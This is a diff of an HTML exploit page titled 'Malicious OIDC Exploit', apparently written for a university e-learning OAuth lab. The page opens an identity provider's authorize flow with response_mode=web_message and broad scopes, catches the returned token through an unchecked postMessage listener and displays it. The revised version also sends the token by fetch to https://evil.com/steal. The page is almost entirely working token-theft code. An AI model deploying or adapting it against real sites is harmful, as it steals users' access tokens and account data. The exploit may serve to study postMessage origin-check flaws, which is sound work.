@@ -1,64 +1,73 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Malicious OIDC Exploit (Raw Text)</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 1em;
-    }
-    #tokenLog {
-      margin-top: 1em;
-      padding: 1em;
-      background: #f0f0f0;
-      border: 1px solid #ccc;
-      white-space: pre-wrap;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>Malicious OIDC Exploit</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        #tokenLog {
+            margin-top: 1em;
+            padding: 1em;
+            background: #f0f0f0;
+            border: 1px solid #ccc;
+            white-space: pre-wrap;
+        }
+    </style>
 </head>
 <body>
-  <h1>Malicious OIDC Exploit</h1>
-  <p>
-    When the victim clicks below, we open the IdP’s login flow. If they’re already
-    logged in, the IdP might immediately post the token/code back to this page
-    via <code>window.postMessage</code>.
-  </p>
-  <button id="stealTokenBtn">Steal the Victim’s Token</button>
+    <h1>Malicious OIDC Exploit</h1>
+    <p>
+        When the victim clicks below, we open the IdP’s login flow. If they’re already
+        logged in, the IdP might immediately post the token/code back to this page
+        via <code>window.postMessage</code>.
+    </p>
+    <button id="stealTokenBtn">Steal the Victim’s Token</button>
 
-  <h2>Captured Token/Response:</h2>
-  <div id="tokenLog">(none yet)</div>
+    <h2>Captured Token/Response:</h2>
+    <div id="tokenLog">(none yet)</div>
 
-  <script>
-    // Change this URL to match the *exact* vulnerable flow request:
-    const authorizeUrl = `https://sp-elearning.cloud.nds.rub.de/oidc_sp/spa-app/?sp_verifier=spa-v5&sp_id=spa-1
-    `.replace(/\s+/g, '');
-      
-    // Open the IdP flow in a new window.
-    document.getElementById("stealTokenBtn").addEventListener("click", () => {
-      window.open(authorizeUrl, "_blank", "width=800,height=600");
-    });
+    <script>
+        // Target OAuth authorization URL (modify accordingly)
+        const authorizeUrl = `https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml
+        ?client_id=spa-1
+        &redirect_uri=https%3A%2F%2Fsp-elearning.cloud.nds.rub.de%3A443%2Foidc_sp%2Fspa%2Fverify
+        &response_mode=web_message
+        &scope=profile+email+calendar+passwords+photos
+        &response_type=token
+        &state=123456789
+        &skip_prompt=1
+        &idp_verifier=spa-a5`.replace(/\s+/g, '');
 
-    // Listen for any postMessage events (the IdP might send the token here).
-    window.addEventListener("message", function (event) {
-      console.log("Got a postMessage event:", event);
+        // Open OAuth login flow in a new window
+        document.getElementById("stealTokenBtn").addEventListener("click", () => {
+            window.open(authorizeUrl, "_blank", "width=800,height=600");
+        });
 
-      // Optionally check event.origin here, if needed:
-      // if (event.origin !== "https://idp-elearning.cloud.nds.rub.de") {
-      //   return;
-      // }
+        // Listen for postMessage events
+        window.addEventListener("message", function (event) {
+            console.log("Received OAuth response:", event);
 
-      // Just show the raw data, no JSON parsing:
-      const tokenLogDiv = document.getElementById("tokenLog");
-      tokenLogDiv.textContent = "Received message:\n" + event.data;
+            // ⚠️ If the SPA does NOT check event.origin, an attacker can steal the token!
+            // ✅ Best practice: Check that the message comes from a trusted domain
+            // if (event.origin !== "https://idp-elearning.cloud.nds.rub.de") {
+            //     console.warn("Untrusted message origin:", event.origin);
+            //     return;
+            // }
 
-      // If we wanted to exfiltrate it to our server:
-      // fetch("https://my-evil-server.com/steal", {
-      //   method: "POST",
-      //   headers: { "Content-Type": "text/plain" },
-      //   body: event.data
-      // });
-    });
-  </script>
+            // Display captured token on the page
+            const tokenLogDiv = document.getElementById("tokenLog");
+            tokenLogDiv.textContent = "Received OAuth Response:\n" + event.data;
+
+            // Optionally, exfiltrate token to attacker's server
+            fetch("https://evil.com/steal", {
+                method: "POST",
+                headers: { "Content-Type": "text/plain" },
+                body: event.data
+            });
+        });
+    </script>
 </body>
 </html>
